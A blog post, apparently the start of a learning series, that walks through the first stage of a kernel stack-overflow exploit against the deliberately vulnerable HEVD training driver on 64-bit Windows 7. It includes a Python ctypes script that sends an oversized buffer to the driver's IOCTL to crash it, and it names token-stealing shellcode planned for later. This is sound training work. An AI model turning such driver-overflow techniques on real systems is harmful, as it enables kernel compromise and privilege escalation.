---
layout: single
title: HEVD Exploits -- Windows 7 x86-64 Stack Overflow
date: 2020-01-21
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Exploit Dev
  - Drivers
  - Windows
  - x86
  - x86-64
  - Shellcoding
  - Kernel Exploitation
  - Stack Overflow
---

## Introduction
Continuing on with the Windows exploit journey, it's time to start exploiting kernel-mode drivers and learning about writing exploits for ring 0. As I did with my OSCE prep, I'm mainly blogging my progress as a way for me to reinforce concepts and keep meticulous notes I can reference later on. I can't tell you how many times I've used my own blog as a reference for something I learned 3 months ago and had totally forgotten. 

This series will be me attempting to run through every exploit on the [Hacksys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver). **I will be using HEVD 2.0**. I can't even begin to explain how amazing a training tool like this is for those of us just starting out. There are a ton of good blog posts out there walking through various HEVD exploits. I recommend you read them all! I referenced them heavily as I tried to complete these exploits. Almost nothing I do or say in this blog will be new or my own thoughts/ideas/techniques. There were instances where I diverged from any strategies I saw employed in the blogposts out of necessity or me trying to do my own thing to learn more.

**This series will be light on tangential information such as:**
+ how drivers work, the different types, communication between userland, the kernel, and drivers, etc
+ how to install HEVD,
+ how to set up a lab environment
+ shellcode analysis

The reason for this is simple, the other blog posts do a much better job detailing this information than I could ever hope to. It feels silly writing this blog series in the first place knowing that there are far superior posts out there; I will not make it even more silly by shoddily explaining these things at a high-level in poorer fashion than those aforementioned posts. Those authors have way more experience than I do and far superior knowledge, I will let them do the explaining. :)

This post/series will instead focus on my experience trying to craft the actual exploits. 

I used the following blogs as references:
+ [@r0otki7's driver installation and lab setup blog post](https://rootkits.xyz/blog/2017/06/kernel-setting-up/),
+ [@r0otki7's x86 Windows 7 HEVD Stack Overflow post](https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/),
+ [@33y0re's x86 Windows 7 HEVD Stack Overflow post](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/),
+ [@\_xpn\_'s x64 Windows 10 HEVD Stack Overflow post](https://blog.xpnsec.com/hevd-stack-overflow/),
+ @sizzop's posts on the HEVD Stack Overflow [bug](https://sizzop.github.io/2016/07/06/kernel-hacking-with-hevd-part-2.html), [shellcode](https://sizzop.github.io/2016/07/07/kernel-hacking-with-hevd-part-3.html), and [exploit](https://sizzop.github.io/2016/07/08/kernel-hacking-with-hevd-part-4.html) respectively,
+ [@ctf_blahcat's x64 Windows 8.1 HEVD Stack Overflow post](https://blahcat.github.io/2017/08/18/first-exploit-in-windows-kernel-hevd/),
+ [@abatchy17's x86 and x64 Token Stealing Shellcode post](https://www.abatchy.com/2018/01/kernel-exploitation-2), and
+ [@hasherezade's HEVD post](https://hshrzd.wordpress.com/2017/06/05/starting-with-windows-kernel-exploitation-part-2/).

There are probably some I even forgot. Huge thanks to the blog authors, no way I could've finished these first two exploits without your help/wisdom. 

## Goal
We just knocked out the Win7 x86 exploit last post, let's get the Win7 x86-64 exploit completed now. We won't be going over most of the things we already covered in the last post. 

We will use a lot of the same approaches from last post with a few changes. Those changes will be:
+ Let's use `VirtualAlloc` instead of `VirtualProtect` this time,
+ We will need to change our script in certain places to work with 64 bit registers,
+ A new token-stealing shellcode provided by @abatchy17,
+ New kernel execution restoration shellcode, and
+ A new `ctypes` function or two.

Let's get started.

## Getting a 64-bit Crash!
We will once again use the `0x222003` IOCTL to reach our desired function `TriggerStackOverflow`, and the `CreateFileA` API will look exactly the same. This will once again return a handle to our device driver. Let's use the handle to call `DeviceIoControl` and get a crash by sending a large buffer. 

To create the buffer, we will use the awesome `ctypes` function `create_string_buffer` which I learned from @sizzop's awesome blog posts on this subject. (In the last post we leaned heavily on @r0otki7, in this one, I leaned heavily on @sizzop.) 

We will start by sending a buffer of 3,000 `"A"`, just like last time and we should get a crash. Right now our code looks like this: 
```python
import ctypes, sys, struct
from ctypes import *
from subprocess import *
import time

kernel32 = windll.kernel32

hevd = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", 
        0xC0000000, 
        0, 
        None, 
        0x3, 
        0, 
        None)
    
if (not hevd) or (hevd == -1):
    print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
    sys.exit(1)
else:
    print("[*] Successfully retrieved handle to device-driver: " + str(hevd))

buf = create_string_buffer("A"*3000)

result = kernel32.DeviceIoControl(
    hevd,
    0x222003,
    addressof(buf),
    (len(buf)-1),
    None,
    0,
    byref(c_ulong()),
    None
)

if result != 0:
        print("[*] Sending payload to driver...")
else:
    print("[!] Unable to send payload to driver.")
    sys.exit(1)
```

A tricky thing here is that when you `create_string_buffer`, your buffer is null terminated. Meaning it's one byte longer than the length we specified. This one is 3001 bytes long. You'll notice in `DeviceIoControl`, we subtracted one from the length of the buffer we want to send for this reason. (Thank you HEVD devs for including debug statements that include the length of the User Buffer!)

Running this on the victim should get us a crash. 

![](/assets/images/AWE/stack.PNG)

You can see as we hit our breakpoint for `TriggerStackOverflow` and step through, we are about to hit a `ret` operation. So I took a look at the stack with the `k` command in WinDBG to see what address we would return to. You can see that the stack is full of our `A`s. We will definitely crash here since `0x4141414141414141` is not a valid address. 

![](/assets/images/AWE/crash64.PNG)

And as you can see, we crashed. 
